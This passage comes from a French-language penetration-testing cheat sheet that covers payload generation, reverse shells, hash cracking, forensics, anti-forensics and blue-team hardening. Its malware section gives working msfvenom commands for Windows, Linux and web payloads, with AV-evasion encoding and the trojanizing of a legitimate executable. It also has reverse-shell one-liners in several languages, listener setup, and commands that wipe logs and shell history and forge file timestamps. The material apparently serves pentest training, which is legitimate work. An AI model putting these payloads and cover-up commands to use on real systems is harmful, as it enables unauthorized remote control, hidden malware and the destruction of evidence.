- Familiarite
- Curiosite
- Peur
```

## 12.3 BAITING

```
- Cle USB infectee
- CD/DVD
- Faux QR codes
```


# ############################################################################
#                    PARTIE 13 : MALWARE ET PAYLOADS
# ############################################################################

## 13.1 MSFVENOM - GENERATION DE PAYLOADS

### Windows
```bash
# Executable
msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f exe > shell.exe
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f exe > shell64.exe

# DLL
msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f dll > shell.dll

# PowerShell
msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f psh > shell.ps1

# VBA (macro)
msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f vba > macro.vba
```

### Linux
```bash
# ELF
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f elf > shell
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f elf > shell64

# Python
msfvenom -p python/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f raw > shell.py
```

### Web
```bash
# PHP
msfvenom -p php/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f raw > shell.php

# JSP
msfvenom -p java/jsp_shell_reverse_tcp LHOST=IP LPORT=4444 -f raw > shell.jsp

# ASP
msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f asp > shell.asp

# ASPX
msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f aspx > shell.aspx

# WAR
msfvenom -p java/jsp_shell_reverse_tcp LHOST=IP LPORT=4444 -f war > shell.war
```

### Evasion
```bash
# Encodage
msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -e x86/shikata_ga_nai -i 5 -f exe > encoded.exe

# Chiffrement
msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=4444 --encrypt aes256 --encrypt-key key -f exe > encrypted.exe

# Template (injecter dans un exe legitime)
msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -x putty.exe -k -f exe > infected_putty.exe
```

## 13.2 REVERSE SHELLS

### Bash
```bash
bash -i >& /dev/tcp/IP/4444 0>&1
bash -c 'bash -i >& /dev/tcp/IP/4444 0>&1'
```

### Netcat
```bash
nc -e /bin/bash IP 4444
nc -c /bin/bash IP 4444
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc IP 4444 >/tmp/f
```

### Python
```python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("IP",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

### PHP
```php
php -r '$sock=fsockopen("IP",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
```

### PowerShell
```powershell
powershell -nop -c "$c=New-Object Net.Sockets.TCPClient('IP',4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length))-ne 0){;$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$r2=$r+'PS '+(pwd).Path+'> ';$sb=([text.encoding]::ASCII).GetBytes($r2);$s.Write($sb,0,$sb.Length);$s.Flush()};$c.Close()"
```

## 13.3 LISTENERS

```bash
# Netcat
nc -lvnp 4444

# Metasploit
msfconsole
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST 0.0.0.0
set LPORT 4444
exploit

# Pwncat (upgrade automatique)
pwncat-cs -lp 4444
```


# ############################################################################
#                    PARTIE 14 : CRYPTOGRAPHIE
# ############################################################################

## 14.1 HASHING

### Identification
```bash
# hashid
hashid 'HASH'

# hash-identifier
hash-identifier

# Exemples
MD5: 32 caracteres hex
SHA1: 40 caracteres hex
SHA256: 64 caracteres hex
NTLM: 32 caracteres hex
bcrypt: $2a$..., $2b$..., $2y$...
```

### Cracking
```bash
# John the Ripper
john --wordlist=rockyou.txt hashes.txt
john --format=raw-md5 hashes.txt
john --format=nt hashes.txt
john --show hashes.txt

# Hashcat
hashcat -m 0 hash.txt wordlist.txt      # MD5
hashcat -m 100 hash.txt wordlist.txt    # SHA1
hashcat -m 1400 hash.txt wordlist.txt   # SHA256
hashcat -m 1000 hash.txt wordlist.txt   # NTLM
hashcat -m 3200 hash.txt wordlist.txt   # bcrypt
hashcat -m 1800 hash.txt wordlist.txt   # SHA512crypt

# Modes d'attaque
hashcat -a 0 hash.txt wordlist.txt      # Dictionnaire
hashcat -a 1 hash.txt dict1.txt dict2.txt # Combinaison
hashcat -a 3 hash.txt ?a?a?a?a?a?a      # Bruteforce
hashcat -a 6 hash.txt wordlist.txt ?d?d?d # Hybrid
```

## 14.2 CHIFFREMENT

### OpenSSL
```bash
# Chiffrer
openssl aes-256-cbc -salt -in file.txt -out file.enc -k password
openssl aes-256-cbc -salt -pbkdf2 -in file.txt -out file.enc

# Dechiffrer
openssl aes-256-cbc -d -in file.enc -out file.txt -k password

# Generer cles RSA
openssl genrsa -out private.pem 2048
openssl rsa -in private.pem -pubout -out public.pem
```

### GPG
```bash
# Chiffrement symetrique
gpg -c file.txt

# Chiffrement asymetrique
gpg --gen-key
gpg --encrypt --recipient user@email.com file.txt
gpg --decrypt file.txt.gpg
```


# ############################################################################
#                    PARTIE 15 : FORENSICS ET ANTI-FORENSICS
# ############################################################################

## 15.1 FORENSICS

### Acquisition
```bash
# Copie bit-a-bit
dd if=/dev/sda of=image.dd bs=4M
dcfldd if=/dev/sda of=image.dd hash=sha256

# Hash de verification
sha256sum image.dd
md5sum image.dd
```

### Analyse memoire
```bash
# Volatility
volatility -f memory.dump imageinfo
volatility -f memory.dump --profile=Win10x64 pslist
volatility -f memory.dump --profile=Win10x64 pstree
volatility -f memory.dump --profile=Win10x64 netscan
volatility -f memory.dump --profile=Win10x64 hashdump
volatility -f memory.dump --profile=Win10x64 filescan
```

### Analyse disque
```bash
# Autopsy (GUI)
autopsy

# Sleuth Kit
mmls image.dd
fls -r image.dd
icat image.dd INODE > file.txt

# Binwalk (firmware)
binwalk firmware.bin
binwalk -e firmware.bin
```

### Analyse reseau
```bash
# Wireshark
wireshark capture.pcap

# tshark
tshark -r capture.pcap
tshark -r capture.pcap -Y "http"
tshark -r capture.pcap -Y "http.request.method==POST"

# NetworkMiner (extraction de fichiers)
```

## 15.2 ANTI-FORENSICS

### Effacement
```bash
# Effacement securise
shred -vfz -n 5 file.txt
wipe file.txt
srm -sz file.txt

# Effacer historique
history -c
echo "" > ~/.bash_history
rm -rf ~/.bash_history

# Effacer logs
echo "" > /var/log/auth.log
rm -rf /var/log/*
```

### Timestamps
```bash
# Modifier timestamps
touch -t 202001010000 file.txt
touch -r reference.txt target.txt
timestomp file.txt -m "01/01/2020 00:00:00"
```

### Steganographie
```bash
# Cacher dans une image
steghide embed -cf image.jpg -ef secret.txt

# Extraire
steghide extract -sf image.jpg

# Autres outils: OpenStego, Stegsolve, zsteg
```


# ############################################################################
#                    PARTIE 16 : OUTILS ESSENTIELS
# ############################################################################

## 16.1 KALI LINUX - OUTILS PREINSTALLES

```
RECONNAISSANCE:
- nmap, masscan
- theHarvester, recon-ng, maltego
- dnsenum, dnsrecon, fierce
- whois, dig, host

WEB:
- burpsuite, OWASP ZAP
- nikto, wapiti, skipfish
- sqlmap, commix
- gobuster, dirb, dirbuster, feroxbuster
- wfuzz, ffuf
- whatweb, wafw00f

EXPLOITATION:
- metasploit-framework
- searchsploit, exploit-db
- setoolkit

PASSWORDS:
- john, hashcat
- hydra, medusa
- crunch, cewl
- mimikatz (Windows)

WIRELESS:
- aircrack-ng suite
- wifite, fern wifi cracker
- kismet, bettercap

FORENSICS:
- autopsy, sleuthkit
- volatility
- binwalk, foremost

REVERSE ENGINEERING:
- ghidra, radare2
- gdb, objdump
- strings, ltrace, strace
```

## 16.2 WORDLISTS

```
/usr/share/wordlists/rockyou.txt              # 14M passwords
/usr/share/wordlists/dirb/common.txt          # Web directories
/usr/share/seclists/                          # Collection complete
/usr/share/wordlists/fasttrack.txt            # Passwords courants
```


# ############################################################################
#                    PARTIE 17 : DEFENSE ET BLUE TEAM
# ############################################################################

## 17.1 HARDENING

### Windows
```powershell
# Activer firewall
netsh advfirewall set allprofiles state on

# Desactiver SMBv1
Set-SmbServerConfiguration -EnableSMB1Protocol $false

# Activer audit
auditpol /set /subcategory:"Logon" /success:enable /failure:enable

# Windows Defender
Set-MpPreference -DisableRealtimeMonitoring $false
Update-MpSignature
```

### Linux
```bash
# Firewall
ufw enable
ufw default deny incoming
ufw allow ssh

# SSH hardening
# /etc/ssh/sshd_config
PermitRootLogin no
PasswordAuthentication no
MaxAuthTries 3

# Mises a jour automatiques
apt install unattended-upgrades
dpkg-reconfigure unattended-upgrades
```

## 17.2 DETECTION

### Logs Windows
```
# Event IDs importants
4624 - Successful logon
4625 - Failed logon
4648 - Explicit credentials logon
4720 - User account created
4732 - Member added to security group
4688 - Process creation
7045 - Service installed
```

### Logs Linux
```
/var/log/auth.log     # Authentification
/var/log/syslog       # Systeme
/var/log/apache2/     # Apache
/var/log/nginx/       # Nginx
/var/log/secure       # RedHat/CentOS auth
```

### SIEM et IDS
```
- Splunk
- ELK Stack (Elasticsearch, Logstash, Kibana)
- Snort, Suricata (IDS/IPS)
- OSSEC, Wazuh (HIDS)
```

## 17.3 INCIDENT RESPONSE

### Etapes
```
1. Preparation
2. Identification
3. Containment
4. Eradication
5. Recovery
6. Lessons Learned
```

### Commandes de reponse rapide
```powershell
# Windows - Connexions suspectes
netstat -ano | findstr ESTABLISHED
Get-NetTCPConnection | Where-Object {$_.State -eq 'Established'}

# Processus suspects
tasklist /v
Get-Process | Sort-Object CPU -Descending

# Services recents
Get-WinEvent -LogName System -MaxEvents 100 | Where-Object {$_.Id -eq 7045}
```

```bash
# Linux
netstat -tulpn
ps aux
lsof -i
last
lastlog
cat /var/log/auth.log | grep -i failed
```


# ############################################################################
#                              FIN DU GUIDE
# ############################################################################
#
# RESSOURCES SUPPLEMENTAIRES:
# - HackTheBox: https://hackthebox.com
# - TryHackMe: https://tryhackme.com
# - PortSwigger Web Academy: https://portswigger.net/web-security
# - OWASP: https://owasp.org
# - CyberDefenders: https://cyberdefenders.org
# - Exploit-DB: https://exploit-db.com
# - GTFOBins: https://gtfobins.github.io
# - LOLBAS: https://lolbas-project.github.io
#
# CERTIFICATIONS:
# - CEH (Certified Ethical Hacker)
# - OSCP (Offensive Security Certified Professional)
# - PNPT (Practical Network Penetration Tester)
# - eJPT (eLearnSecurity Junior Penetration Tester)
# - CompTIA Security+, PenTest+
#
# ############################################################################
